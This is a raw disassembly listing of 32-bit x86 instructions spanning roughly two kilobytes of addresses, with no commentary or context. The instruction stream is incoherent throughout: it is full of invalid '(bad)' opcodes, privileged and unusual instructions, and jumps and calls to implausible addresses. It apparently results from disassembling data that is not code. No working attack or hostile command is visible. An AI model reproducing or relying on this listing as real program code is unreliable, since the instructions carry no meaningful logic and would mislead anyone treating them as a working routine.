  41abed:	dec    ecx
  41abee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abef:	mov    tr6,ebp
  41abf2:	inc    edx
  41abf3:	inc    BYTE PTR [edx-0x8baa47c]
  41abf9:	dec    ebp
  41abfa:	sahf   
  41abfb:	(bad)  
  41abfc:	hlt    
  41abfd:	mov    ebp,0x50bc922a
  41ac02:	das    
  41ac03:	jo     0x41ac39
  41ac05:	cmp    bl,BYTE PTR [edi+0x38]
  41ac08:	inc    esp
  41ac09:	inc    edi
  41ac0a:	ret    
  41ac0b:	dec    esp
  41ac0c:	sti    
  41ac0d:	xchg   ebx,eax
  41ac0e:	lods   eax,DWORD PTR ds:[esi]
  41ac0f:	pop    es
  41ac10:	pop    ebp
  41ac11:	js     0x41abd1
  41ac13:	test   al,0xa0
  41ac15:	sahf   
  41ac16:	xor    DWORD PTR [edi],ebx
  41ac18:	and    al,0xc3
  41ac1a:	pop    ds
  41ac1b:	ret    0xe85f
  41ac1e:	shr    BYTE PTR ds:0x6779251d,cl
  41ac24:	pop    es
  41ac25:	push   cs
  41ac26:	pop    edx
  41ac27:	imul   edx,DWORD PTR [edx+0x5e],0x6b
  41ac2b:	xchg   edx,eax
  41ac2c:	jne    0x41ac80
  41ac2e:	dec    edi
  41ac2f:	or     al,BYTE PTR [ecx+0x3e848fb1]
  41ac35:	mov    ds:0x490d7818,eax
  41ac3a:	pop    esi
  41ac3b:	sbb    edi,DWORD PTR [ebp+0x581172d9]
  41ac41:	outs   dx,DWORD PTR ds:[esi]
  41ac42:	mov    WORD PTR [eax],cs
  41ac44:	sub    al,0x3
  41ac46:	repz dec edx
  41ac48:	or     BYTE PTR ds:0xa6ca069e,0xb
  41ac4f:	pop    edi
  41ac50:	xchg   edi,eax
  41ac51:	lods   eax,DWORD PTR ds:[esi]
  41ac52:	xor    bh,0xba
  41ac55:	dec    edx
  41ac56:	jns    0x41ac2d
  41ac58:	imul   edx,esi,0xd76c165a
  41ac5e:	hlt    
  41ac5f:	sahf   
  41ac60:	cmp    esi,DWORD PTR [esi-0x72d9ae6b]
  41ac66:	xchg   bh,ch
  41ac68:	inc    ebp
  41ac69:	clc    
  41ac6a:	pop    es
  41ac6b:	iret   
  41ac6c:	or     cl,BYTE PTR ds:0xf51c698d
  41ac72:	push   es
  41ac73:	lahf   
  41ac74:	mov    ch,0x29
  41ac76:	pop    esi
  41ac77:	cli    
  41ac78:	push   0xfe5c2929
  41ac7d:	(bad)  
  41ac7e:	pop    eax
  41ac7f:	cdq    
  41ac80:	loope  0x41ac07
  41ac82:	inc    edx
  41ac83:	lahf   
  41ac84:	xchg   esp,eax
  41ac85:	(bad)  
  41ac86:	int3   
  41ac87:	or     ah,BYTE PTR [ebp+0x3a]
  41ac8a:	add    BYTE PTR [edi+0x5f],0x4a
  41ac8e:	out    0x1e,al
  41ac90:	jns    0x41ace4
  41ac92:	xchg   edx,eax
  41ac93:	push   es
  41ac94:	push   edx
  41ac95:	loope  0x41acbb
  41ac97:	pop    ss
	...
  41ad14:	push   ebx
  41ad15:	inc    edx
  41ad16:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41ad1d:	pop    eax
  41ad1e:	cdq    
  41ad1f:	sar    DWORD PTR [ecx+0x41efc838],0x4c
  41ad26:	add    DWORD PTR [eax],eax
  41ad28:	ins    BYTE PTR es:[edi],dx
  41ad29:	pop    es
  41ad2a:	add    BYTE PTR [eax],al
  41ad2c:	push   ss
  41ad2d:	stos   BYTE PTR es:[edi],al
  41ad2e:	mov    ch,cl
  41ad30:	pop    edi
  41ad31:	sbb    bh,BYTE PTR [eax-0x1a]
  41ad34:	push   esi
  41ad35:	sbb    bl,BYTE PTR [edx]
  41ad37:	mov    dh,BYTE PTR [ecx-0x2b704615]
  41ad3d:	xor    ecx,DWORD PTR [ebp-0x50]
  41ad40:	mov    bl,0x78
  41ad42:	adc    BYTE PTR [edx+0x6a21f567],0xbf
  41ad49:	mov    bl,0x3
  41ad4b:	mov    es,WORD PTR [edx-0x75b5c669]
  41ad51:	jb     0x41ad4e
  41ad53:	data16 mov ch,0x39
  41ad56:	cmp    cl,BYTE PTR [eax-0x45781147]
  41ad5c:	test   al,0x8e
  41ad5e:	shl    BYTE PTR [esp+edi*1+0x472c5a4a],0x17
  41ad66:	add    BYTE PTR [ebx+0x54],al
  41ad69:	pushf  
  41ad6a:	push   edi
  41ad6b:	leave  
  41ad6c:	sub    bh,ah
  41ad6e:	and    BYTE PTR [ebp-0x421198b3],dh
  41ad74:	inc    ebp
  41ad75:	pop    ss
  41ad76:	int3   
  41ad77:	aad    0xca
  41ad79:	ret    
  41ad7a:	imul   edx,DWORD PTR [eax+ecx*2-0x1e588c69],0x8dfb4e32
  41ad85:	mov    cl,0xe6
  41ad87:	lea    edx,[ebp+eiz*2-0x19]
  41ad8b:	dec    eax
  41ad8c:	stc    
  41ad8d:	mov    esi,DWORD PTR [ebx]
  41ad8f:	ins    DWORD PTR es:[edi],dx
  41ad90:	adc    BYTE PTR [edi],dl
  41ad92:	les    edi,FWORD PTR [eax+0x5405ca71]
  41ad98:	ds (bad) 
  41ad9b:	inc    edx
  41ad9c:	inc    edx
  41ad9d:	xchg   esp,eax
  41ad9e:	int3   
  41ad9f:	shl    BYTE PTR [edi],cl
  41ada1:	and    dl,BYTE PTR [edx]
  41ada3:	leave  
  41ada4:	pushf  
  41ada5:	sub    BYTE PTR [ebp+0x9041021],0x4c
  41adac:	jmp    0x91622152
  41adb1:	and    al,0x83
  41adb3:	(bad)  
  41adb4:	shl    DWORD PTR [ebx-0x74b40661],cl
  41adba:	xor    bl,al
  41adbc:	jns    0x41ae3a
  41adbe:	mov    ebx,edi
  41adc0:	jl     0x41adba
  41adc2:	lods   al,BYTE PTR ds:[esi]
  41adc3:	test   BYTE PTR [ebx],dl
  41adc5:	(bad)  
  41adc6:	jbe    0x41ad76
  41adc8:	jno    0x41ae46
  41adca:	ins    BYTE PTR es:[edi],dx
  41adcb:	dec    ebx
  41adcc:	sbb    DWORD PTR [ebx+0x2ae0060b],edx
  41add2:	cli    
  41add3:	push   edi
  41add4:	call   0xe16942ef
  41add9:	fisub  WORD PTR [ebx]
  41addb:	repnz aad 0xca
  41adde:	xlat   BYTE PTR ds:[ebx]
  41addf:	dec    ebx
  41ade0:	fcomp  QWORD PTR [ebx+0x42]
  41ade3:	xchg   ebp,eax
  41ade4:	data16 fld TBYTE PTR [esp-0x4d]
  41ade9:	les    edx,FWORD PTR [eax]
  41adeb:	lods   al,BYTE PTR ds:[esi]
  41adec:	sahf   
  41aded:	hlt    
  41adee:	pop    ecx
  41adef:	fidivr WORD PTR [ebp+0x7f46b3bf]
  41adf5:	xchg   BYTE PTR [edi+0x6f573b77],al
  41adfb:	shl    ebx,0xe3
  41adfe:	stc    
  41adff:	fs xor ebp,0xffffff9f
  41ae03:	mov    ebp,0x681b9d43
  41ae08:	push   edx
  41ae09:	adc    cl,BYTE PTR [ecx-0x736cbd8c]
  41ae0f:	add    BYTE PTR [esi+0x1a],dl
  41ae12:	jno    0x41ae36
  41ae14:	arpl   WORD PTR [edi],si
  41ae16:	inc    ebp
  41ae17:	lods   eax,DWORD PTR ds:[esi]
  41ae18:	and    edx,DWORD PTR [eax+0x5d]
  41ae1b:	sahf   
  41ae1c:	bound  ecx,QWORD PTR [eax+ebp*4-0x462fb255]
  41ae23:	adc    DWORD PTR [ecx],ecx
  41ae25:	shr    DWORD PTR [ebx+0x8],cl
  41ae28:	sbb    bl,BYTE PTR [eax]
  41ae2a:	addr16 push esi
  41ae2c:	ins    DWORD PTR es:[edi],dx
  41ae2d:	(bad)  
  41ae2e:	test   DWORD PTR [edx],0xe9271b09
  41ae34:	push   ebp
  41ae35:	fadd   DWORD PTR [esi+ebp*1-0x14]
  41ae39:	stos   BYTE PTR es:[edi],al
  41ae3a:	and    DWORD PTR cs:[eax],esp
  41ae3d:	call   0xf5c3:0xfcd1769
  41ae44:	sub    al,0x10
  41ae47:	retfw  
  41ae49:	loop   0x41ae66
  41ae4b:	cmp    edi,DWORD PTR [ebx+0x59]
  41ae4e:	mov    ds:0x6d464479,eax
  41ae53:	dec    ecx
  41ae54:	cli    
  41ae55:	push   ecx
  41ae56:	ror    BYTE PTR [ebp-0x454b9d8a],1
  41ae5c:	and    dh,BYTE PTR [eax+0x62]
  41ae5f:	sbb    DWORD PTR [edx+0x52fb5c72],ebx
  41ae65:	xlat   BYTE PTR ds:[ebx]
  41ae66:	clc    
  41ae67:	adc    DWORD PTR [esi+0x7a],edi
  41ae6a:	xchg   ebp,eax
  41ae6b:	mov    ds:0x739a5478,eax
  41ae70:	stc    
  41ae71:	bound  edi,QWORD PTR [ebx-0x78]
  41ae74:	hlt    
  41ae75:	push   0x5e
  41ae77:	clc    
  41ae78:	cli    
  41ae79:	icebp  
  41ae7a:	sub    al,0x4a
  41ae7c:	test   BYTE PTR [edi-0x62fc1470],0x36
  41ae83:	fst    QWORD PTR [eax+0x5]
  41ae86:	mov    cl,0x16
  41ae88:	push   esi
  41ae89:	jmp    0x4ec7fdc1
  41ae8e:	or     eax,0xe23c6e9d
  41ae93:	add    al,0x39
  41ae95:	jp     0x41aecb
  41ae97:	mov    eax,0x77e20ffc
  41ae9c:	test   BYTE PTR [edi-0x71024aa5],dl
  41aea2:	jae    0x41af1a
  41aea4:	push   ecx
  41aea5:	bound  esp,QWORD PTR [edi-0x3]
  41aea8:	call   0xfa4b:0xe44b096a
  41aeaf:	add    eax,0x5ac1386d
  41aeb4:	xchg   ebx,eax
  41aeb5:	stos   BYTE PTR es:[edi],al
  41aeb6:	shr    DWORD PTR [edx],0xdc
  41aeb9:	iret   
  41aeba:	mov    WORD PTR [edi+ecx*1-0x65e40a4e],cs
  41aec1:	jge    0x41aed6
  41aec3:	mov    ?,WORD PTR [esi]
  41aec5:	sbb    esp,DWORD PTR [esi+0x4c]
  41aec8:	mov    ebp,DWORD PTR [edi-0x76]
  41aecb:	mov    dl,0x49
  41aecd:	aas    
  41aece:	pop    ecx
  41aecf:	mov    bh,0x20
  41aed1:	pop    ds
  41aed2:	adc    dh,cl
  41aed4:	and    al,0x42
  41aed6:	getsec 
  41aed8:	ret    0x4106
  41aedb:	and    BYTE PTR [ebp+0x77979679],0x60
  41aee2:	stc    
  41aee3:	cmp    BYTE PTR [ebp+0x6c20b391],0xd9
  41aeea:	in     al,0x36
  41aeec:	adc    ah,BYTE PTR [edx+0x64]
  41aeef:	or     eax,0x8b08dc5a
  41aef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aef5:	mov    WORD PTR [edx+ebp*8+0x9],gs
  41aef9:	sar    DWORD PTR [ebp+0x41],cl
  41aefc:	mov    eax,ds:0xa14aaa6c
  41af01:	pushf  
  41af02:	add    al,0x63
  41af04:	sbb    al,0x0
  41af06:	mov    BYTE PTR [ebx+ebp*4+0x152916f6],dl
  41af0d:	adc    al,0x93
  41af0f:	gs mov ch,0x66
  41af12:	test   al,0xa8
  41af14:	shl    BYTE PTR [esp+edi*4+0x4e],0xae
  41af19:	retf   0x2e60
  41af1c:	stos   DWORD PTR es:[edi],eax
  41af1d:	loopne 0x41aecd
  41af1f:	and    al,0x1b
  41af21:	das    
  41af22:	pop    ebx
  41af23:	push   edx
  41af24:	or     BYTE PTR [ecx],bl
  41af26:	leave  
  41af27:	xchg   edi,eax
  41af28:	pop    ss
  41af29:	sbb    DWORD PTR [esi-0x6ab6d99],ebp
  41af2f:	pop    edx
  41af30:	xlat   BYTE PTR ds:[ebx]
  41af31:	or     eax,0xbf5af21e
  41af36:	adc    BYTE PTR [ecx+0x11],ch
  41af39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af3a:	mov    esi,0x43a9bf01
  41af3f:	and    al,0x92
  41af41:	cmc    
  41af42:	sbb    DWORD PTR [ebx-0x3c],esi
  41af45:	jg     0x41af36
  41af47:	jne    0x41afa9
  41af49:	or     esp,DWORD PTR [eax-0x73dfef12]
  41af4f:	mov    DWORD PTR [esi],ebx
  41af51:	std    
  41af52:	push   cs
  41af53:	adc    ebp,edx
  41af55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af56:	lods   eax,DWORD PTR ds:[esi]
  41af57:	imul   esp,DWORD PTR [esp+ebx*1],0xa00243c7
  41af5e:	xor    cl,ah
  41af60:	out    0x99,eax
  41af62:	dec    ecx
  41af63:	cmc    
  41af64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af65:	popa   
  41af66:	pop    eax
  41af67:	jge    0x41af54
  41af69:	xchg   esp,eax
  41af6a:	pop    ds
  41af6b:	lods   eax,DWORD PTR ds:[esi]
  41af6c:	ss daa 
  41af6e:	dec    BYTE PTR [ebx*8-0x3376e2cd]
  41af75:	dec    edi
  41af76:	dec    esi
  41af77:	sbb    DWORD PTR [edx+ebx*2+0x1b],eax
  41af7b:	sahf   
  41af7c:	popf   
  41af7d:	jecxz  0x41af9e
  41af7f:	mov    al,ds:0xb73700ee
  41af84:	lods   al,BYTE PTR ds:[esi]
  41af85:	jbe    0x41af67
  41af87:	pushf  
  41af88:	push   ebx
  41af89:	pop    eax
  41af8a:	mov    cl,0x5d
  41af8c:	dec    ebx
  41af8d:	adc    edi,edi
  41af8f:	sbb    BYTE PTR [ebp+0x59652f84],cl
  41af95:	or     ch,BYTE PTR [ebx-0x4c]
  41af98:	shl    BYTE PTR [edi],0x2d
  41af9b:	out    dx,eax
  41af9c:	sub    bl,BYTE PTR [ebx]
  41af9e:	mov    esp,0x226c5e1
  41afa3:	xchg   ebx,eax
  41afa4:	adc    al,BYTE PTR [eax]
  41afa6:	outs   dx,BYTE PTR ds:[esi]
  41afa7:	xor    BYTE PTR [eax+edi*8],bl
  41afaa:	sbb    eax,0xb47b76e1
  41afaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afb0:	push   edi
  41afb1:	jmp    0xc553:0xdcfff18c
  41afb8:	or     DWORD PTR ds:0x41217269,edx
  41afbe:	shl    BYTE PTR [esi],0x4e
  41afc1:	fimul  WORD PTR [ebp-0x74]
  41afc4:	inc    edi
  41afc5:	jbe    0x41afbd
  41afc7:	mov    ecx,0x70803307
  41afcc:	lods   eax,DWORD PTR ds:[esi]
  41afcd:	xor    ebx,DWORD PTR [eax-0x128ae0a2]
  41afd3:	pushf  
  41afd4:	addr16 mov bh,0x14
  41afd7:	sbb    BYTE PTR [ebx+0x306c6d4],dh
  41afdd:	push   esp
  41afde:	jecxz  0x41af78
  41afe0:	and    BYTE PTR [ecx+0x74],0xa7
  41afe4:	sbb    DWORD PTR [eax+0x71],edx
  41afe7:	pushw  ds
  41afe9:	push   cs
  41afea:	pop    ebp
  41afeb:	idiv   BYTE PTR [eax+0x24]
  41afee:	lods   eax,DWORD PTR ds:[esi]
  41afef:	mov    eax,ds:0x6ea5349d
  41aff4:	and    eax,0xf2072cee
  41aff9:	test   eax,0xf0126798
  41affe:	push   cs
  41afff:	rcl    BYTE PTR [ebx],cl
  41b001:	loop   0x41b034
  41b003:	fst    DWORD PTR [edx-0x2b]
  41b006:	out    0x76,al
  41b008:	fcmovbe st,st(3)
  41b00a:	and    BYTE PTR [eax-0x8edc93],bh
  41b010:	push   ecx
  41b011:	and    al,0x66
  41b013:	stos   BYTE PTR es:[edi],al
  41b014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b015:	adc    ah,bh
  41b017:	arpl   WORD PTR [eax+0x3576e54],dx
  41b01d:	(bad)  
  41b01e:	xchg   edx,eax
  41b01f:	jmp    0xd37cdc26
  41b024:	jecxz  0x41b054
  41b026:	and    al,0x3a
  41b028:	imul   eax,DWORD PTR [ecx+0x63],0xffffffad
  41b02c:	push   eax
  41b02d:	scas   eax,DWORD PTR es:[edi]
  41b02e:	shl    BYTE PTR [ecx+0x17893938],0xa4
  41b035:	pop    ebx
  41b036:	imul   ebp,DWORD PTR [edx-0x7a],0x5f11611f
  41b03d:	xor    DWORD PTR [ecx],0xa90ce30a
  41b043:	and    DWORD PTR [eax-0x2c],esi
  41b046:	adc    ecx,DWORD PTR [ebx+edx*2-0x5bd10479]
  41b04d:	xchg   edi,eax
  41b04e:	xor    ebx,DWORD PTR [ebp-0x6981c46e]
  41b054:	ins    BYTE PTR es:[edi],dx
  41b055:	dec    ebp
  41b056:	scas   al,BYTE PTR es:[edi]
  41b057:	push   ecx
  41b058:	add    BYTE PTR [edx],ch
  41b05a:	push   esi
  41b05b:	repnz mov ebp,0x15027696
  41b061:	sub    eax,0xdd3232c3
  41b066:	jo     0x41aff8
  41b068:	test   BYTE PTR [ecx+0x52],dh
  41b06b:	inc    esp
  41b06c:	jae    0x41b032
  41b06e:	lds    esp,FWORD PTR [eax-0x378f56dc]
  41b074:	div    edi
  41b076:	xor    eax,0x953525d7
  41b07b:	mov    dh,0xfb
  41b07d:	out    dx,eax
  41b07e:	cdq    
  41b07f:	call   0xfb74:0x8379315c
  41b086:	pop    eax
  41b087:	jno    0x41b0b4
  41b089:	jo     0x41b010
  41b08b:	dec    edx
  41b08c:	ficomp DWORD PTR ds:0x7088371d
  41b092:	dec    esp
  41b093:	xchg   esp,eax
  41b094:	inc    esp
  41b095:	enter  0x689c,0x3f
  41b099:	data16 mov dl,0xe5
  41b09c:	arpl   WORD PTR [esi+ecx*4+0x63ef2996],cx
  41b0a3:	mov    al,ds:0x970ac24e
  41b0a8:	mov    eax,0x4ced21db
  41b0ad:	outs   dx,DWORD PTR ds:[esi]
  41b0ae:	pop    ss
  41b0af:	retf   
  41b0b0:	fisubr DWORD PTR [esi]
  41b0b2:	or     ah,cl
  41b0b4:	sub    BYTE PTR [ebp+0x36863cab],0xf
  41b0bb:	push   ebp
  41b0bd:	xchg   esi,eax
  41b0be:	xchg   ebp,eax
  41b0bf:	inc    eax
  41b0c0:	push   esi
  41b0c1:	clc    
  41b0c2:	inc    edx
  41b0c3:	fsubr  QWORD PTR [edi+eax*4-0x59e87d9a]
  41b0ca:	jne    0x41b144
  41b0cc:	adc    BYTE PTR [edx],cl
  41b0ce:	out    dx,al
  41b0cf:	jp     0x41b052
  41b0d1:	jb     0x41b0db
  41b0d3:	cli    
  41b0d4:	(bad)  
  41b0d5:	dec    ebx
  41b0d6:	jp     0x41b060
  41b0d8:	aaa    
  41b0d9:	mov    esp,0xba791e52
  41b0de:	stc    
  41b0df:	sbb    DWORD PTR [edx+0x63],ebx
  41b0e2:	dec    esi
  41b0e3:	js     0x41b115
  41b0e5:	adc    ebp,eax
  41b0e7:	mov    dl,0xf4
  41b0e9:	push   ebp
  41b0ea:	inc    ebp
  41b0eb:	mov    ah,0x28
  41b0ed:	pusha  
  41b0ee:	mov    ebx,DWORD PTR ds:0xf4e6d58b
  41b0f4:	push   ss
  41b0f5:	(bad)  
  41b0f7:	push   0xffffffbd
  41b0f9:	neg    BYTE PTR [edi-0x2ddd2ec5]
  41b0ff:	jg     0x41b0e3
  41b101:	jle    0x41b0d7
  41b103:	mov    cl,0xa8
  41b105:	and    eax,0xf535d8b7
  41b10a:	ins    DWORD PTR es:[edi],dx
  41b10b:	mov    eax,0x18100bbf
  41b110:	mov    bh,0xb9
  41b112:	xchg   ebp,eax
  41b113:	fstp   DWORD PTR [esp+esi*1]
  41b116:	daa    
  41b117:	enter  0x81b2,0xba
  41b11b:	dec    eax
  41b11c:	lahf   
  41b11d:	xchg   ebx,ebp
  41b11f:	mov    BYTE PTR [edx+0x48],al
  41b122:	mov    ah,0x8a
  41b124:	inc    ecx
  41b125:	out    0xbc,eax
  41b127:	push   eax
  41b128:	adc    dh,BYTE PTR [edx+0x40e34991]
  41b12e:	sbb    eax,0xda12c5aa
  41b133:	je     0x41b0f8
  41b135:	mov    ch,0x26
  41b137:	dec    ebx
  41b138:	call   0xc7bd54f1
  41b13d:	lods   al,BYTE PTR ds:[esi]
  41b13e:	mov    ecx,0xcf720572
  41b143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b144:	jle    0x41b0cb
  41b146:	adc    edi,DWORD PTR [edx+0x266bdbc3]
  41b14c:	(bad)  
  41b14d:	repz pop es
  41b14f:	and    BYTE PTR [eax],ah
  41b151:	push   edi
  41b152:	pop    ebx
  41b153:	loope  0x41b1c0
  41b155:	popf   
  41b156:	fnstcw WORD PTR [esi]
  41b158:	js     0x41b123
  41b15a:	mov    ecx,0x38e85299
  41b15f:	out    dx,al
  41b160:	mov    al,ds:0x704f3a0b
  41b165:	or     al,0x8f
  41b167:	jo     0x41b147
  41b169:	dec    ebp
  41b16a:	inc    esi
  41b16b:	xchg   esp,eax
  41b16c:	adc    eax,0x19a532a2
  41b171:	repz push ecx
  41b173:	fdivr  QWORD PTR [edx-0x1]
  41b176:	inc    edx
  41b177:	dec    eax
  41b178:	ins    DWORD PTR es:[edi],dx
  41b179:	push   0x88df2d3b
  41b17e:	push   0x33
  41b180:	jp     0x41b1f0
  41b182:	pop    edx
  41b183:	xchg   BYTE PTR [ebx+0x2b9e9217],dl
  41b189:	in     eax,0x68
  41b18b:	ficomp WORD PTR [ecx-0x30]
  41b18e:	les    esi,FWORD PTR [ebx]
  41b190:	add    eax,0x85c9177
  41b195:	xchg   ebp,eax
  41b196:	sbb    BYTE PTR [esi],dh
  41b198:	mov    edi,es
  41b19a:	pop    es
  41b19b:	retf   0x2efa
  41b19e:	pusha  
  41b19f:	ret    
  41b1a0:	retf   0x7a57
  41b1a3:	push   ecx
  41b1a4:	iret   
  41b1a5:	add    eax,0x34add8d5
  41b1aa:	jno    0x41b14d
  41b1ac:	sti    
  41b1ad:	popa   
  41b1ae:	outs   dx,DWORD PTR ds:[esi]
  41b1af:	sub    BYTE PTR [esi+0x66],0xa2
  41b1b3:	jb     0x41b20c
  41b1b5:	mov    dl,0x17
  41b1b7:	mov    al,ds:0xa47286f9
  41b1bc:	shr    BYTE PTR [ebp+0x5d],1
  41b1bf:	jp     0x41b1d4
  41b1c1:	xchg   edi,eax
  41b1c2:	pop    es
  41b1c3:	ffree  st(3)
  41b1c5:	jg     0x41b154
  41b1c7:	pop    eax
  41b1c8:	jne    0x41b1de
  41b1ca:	jge    0x41b1b7
  41b1cc:	push   eax
  41b1cd:	jecxz  0x41b173
  41b1cf:	leave  
  41b1d0:	pushf  
  41b1d1:	jnp    0x41b23c
  41b1d3:	mov    dh,0xb0
  41b1d5:	push   ds
  41b1d6:	sqrtps xmm3,xmm6
  41b1d9:	sub    al,0x9d
  41b1db:	test   eax,0xd2c47e0e
  41b1e0:	mov    al,ds:0xba3e2cca
  41b1e5:	icebp  
  41b1e6:	dec    esp
  41b1e7:	clc    
  41b1e8:	dec    edx
  41b1e9:	inc    edx
  41b1ea:	stos   DWORD PTR es:[edi],eax
  41b1eb:	adc    ecx,DWORD PTR [ebx]
  41b1ed:	retf   0xd16e
  41b1f0:	jmp    0x41b261
  41b1f2:	arpl   WORD PTR [edi-0x57],si
  41b1f5:	mov    esi,0xdcf0e73e
  41b1fa:	push   ss
  41b1fb:	xchg   ebp,eax
  41b1fc:	jbe    0x41b25d
  41b1fe:	add    al,ah
  41b200:	jo     0x41b1e5
  41b202:	sbb    DWORD PTR [ebp-0x57],esp
  41b205:	jg     0x41b1ff
  41b207:	les    esi,FWORD PTR [eax+0x26b9d79c]
  41b20d:	psrlw  mm3,QWORD PTR [ebx+0x26d4e14f]
  41b214:	cmp    eax,0x6f309842
  41b219:	dec    esp
  41b21a:	in     eax,dx
  41b21b:	push   ecx
  41b21c:	dec    edi
  41b21d:	jmp    0x7a63b8e0
  41b222:	inc    ebx
  41b223:	inc    ebx
  41b224:	push   ss
  41b225:	mov    ss,WORD PTR [esi+eax*2]
  41b228:	stos   BYTE PTR es:[edi],al
  41b229:	dec    edi
  41b22a:	adc    al,0x1b
  41b22c:	mov    BYTE PTR [eax],ch
  41b22e:	dec    esp
  41b22f:	mov    dh,0x32
  41b231:	shl    BYTE PTR [eax],0x7b
  41b234:	je     0x41b1e1
  41b236:	test   al,0x35
  41b238:	(bad)  
  41b239:	arpl   WORD PTR fs:[esi+esi*8+0x4f],bp
  41b23e:	hlt    
  41b23f:	cmc    
  41b240:	cmp    al,0x29
  41b242:	ins    BYTE PTR es:[edi],dx
  41b243:	add    al,0x3
  41b245:	lods   eax,DWORD PTR ds:[esi]
  41b246:	mov    eax,0xb8c162e9
  41b24b:	mov    al,0x33
  41b24d:	adc    BYTE PTR [ecx],dh
  41b24f:	addr16 (bad) 
  41b251:	int    0x34
  41b253:	xchg   ecx,ebx
  41b255:	aad    0x61
  41b257:	and    DWORD PTR [eax-0x7b],0xffffffa1
  41b25b:	ret    0x61c3
  41b25e:	in     eax,dx
  41b25f:	xchg   DWORD PTR [ecx-0x7e534768],esp
  41b265:	mov    ch,0x8f
  41b267:	adc    eax,0x2025912d
  41b26c:	pop    eax
  41b26d:	jno    0x41b2bd
  41b26f:	pop    ebp
  41b270:	mov    ebx,0x65a8914b
  41b275:	adc    ecx,DWORD PTR [eax+0x36]
  41b278:	mov    bl,cl
  41b27a:	popf   
  41b27b:	mov    al,ds:0xd090c8d6
  41b280:	(bad)  
  41b281:	loopne 0x41b2b4
  41b283:	xchg   edi,eax
  41b284:	adc    ecx,DWORD PTR [edi+0x5acdebff]
  41b28a:	jns    0x41b216
  41b28c:	mov    bl,0x55
  41b28e:	pop    ebx
  41b28f:	xor    eax,0x45ce0e3e
  41b294:	adc    dl,bl
  41b296:	outs   dx,DWORD PTR ds:[esi]
  41b297:	out    0xec,al
  41b299:	lock inc esp
  41b29b:	mov    ah,0x1b
  41b29d:	xor    al,0xa6
  41b29f:	das    
  41b2a0:	jle    0x41b293
  41b2a2:	push   ds
  41b2a3:	shl    DWORD PTR [esi+ebx*8],0x9a
  41b2a7:	pop    edx
  41b2a8:	ins    BYTE PTR es:[edi],dx
  41b2a9:	test   DWORD PTR [ebx],0x70297609
  41b2af:	loope  0x41b23e
  41b2b1:	es mov al,cl
  41b2b4:	in     eax,0xd3
  41b2b6:	mov    al,0xcd
  41b2b8:	jp     0x41b2cb
  41b2ba:	pop    ss
  41b2bb:	pusha  
  41b2bc:	lds    edx,FWORD PTR [edx-0x15]
  41b2bf:	adc    esi,DWORD PTR ds:0x6e506a82
  41b2c5:	push   ebx
  41b2c6:	inc    ebx
  41b2c7:	arpl   WORD PTR [edx-0x58c1cbdf],cx
  41b2cd:	fs cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  41b2d0:	mov    cl,0xe3
  41b2d2:	add    al,0x21
  41b2d4:	ror    BYTE PTR [ebp+0x3f430ca1],1
  41b2da:	aaa    
  41b2db:	inc    esi
  41b2dc:	mov    WORD PTR [edx-0x3a5d4548],?
  41b2e2:	pushf  
  41b2e3:	jg     0x41b2b8
  41b2e5:	fcmovb st,st(6)
  41b2e7:	in     al,dx
  41b2e8:	xor    dl,0x45
  41b2eb:	mov    bh,0xc
  41b2ed:	sbb    eax,0xa8f90f8c
  41b2f2:	pop    esp
  41b2f3:	sbb    BYTE PTR ss:[esi+0x54],cl
  41b2f7:	sub    BYTE PTR [esi+0x3725f74f],ah
  41b2fd:	add    DWORD PTR [edx-0x4990fc63],0x5a9131d
  41b307:	xchg   BYTE PTR [edx-0x62],bh
  41b30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b30b:	in     eax,0xe8
  41b30d:	or     DWORD PTR [ecx+0x2a5c427c],ecx
  41b313:	mov    al,ds:0xd014c9f
  41b318:	inc    edi
  41b319:	mov    ebx,0xe9693585
  41b31e:	inc    ecx
  41b31f:	mov    dh,0x8b
  41b321:	icebp  
  41b322:	sub    ebx,eax
  41b324:	repz scas eax,DWORD PTR es:[edi]
  41b326:	cmp    al,0xf4
  41b328:	adc    bl,BYTE PTR [eax+0x8]
  41b32b:	add    BYTE PTR ds:0xde2ae6c7,al
  41b331:	dec    ebp
  41b332:	mov    al,0xeb
  41b334:	and    dl,al
  41b336:	in     eax,0x2f
  41b338:	adc    BYTE PTR [ecx+0x5ad9e814],ch
  41b33e:	inc    edx
  41b33f:	dec    ebx
  41b340:	and    al,BYTE PTR ds:[edi+0x8]
  41b344:	shl    BYTE PTR [ecx-0x7b],1
  41b347:	call   0xcaea8877
  41b34c:	xor    DWORD PTR ds:[ecx-0x19d9e78e],0xffffffc9
  41b354:	lahf   
  41b355:	or     dh,BYTE PTR [ebp+0x3]
  41b358:	idiv   edx
  41b35a:	pop    es
  41b35b:	ret    0x5e7d
  41b35e:	xchg   BYTE PTR ds:0xb64609d6,ch
  41b364:	jg     0x41b370
  41b366:	xor    ebx,DWORD PTR [ecx-0x6a30f78e]
  41b36c:	shl    DWORD PTR [esi-0x23],0x1c
  41b370:	mov    si,bx
  41b373:	mov    edx,0xad19eb33
  41b378:	ins    BYTE PTR es:[edi],dx
  41b379:	dec    ebx
  41b37a:	mov    bl,0x45
  41b37c:	push   cs
  41b37d:	pop    ebx
  41b37e:	or     al,0x4f
  41b380:	inc    esp
  41b381:	pop    eax
  41b382:	xchg   BYTE PTR ds:0xbaf22998,cl
  41b388:	pop    edx
  41b389:	inc    ecx
  41b38a:	lock ror BYTE PTR es:[esi+0x34],0x71
  41b390:	mov    dl,0x17
  41b392:	cmc    
  41b393:	jle    0x41b3fe
  41b395:	and    ebp,DWORD PTR [edi+eiz*1]
  41b398:	xchg   DWORD PTR [eax+0x76],edx
  41b39b:	iret   
  41b39c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b39d:	jp     0x41b38c
  41b39f:	jae    0x41b40a
  41b3a1:	in     al,0xec
  41b3a3:	or     ebx,DWORD PTR [esi+0x5eb5f325]
  41b3a9:	xchg   esp,eax
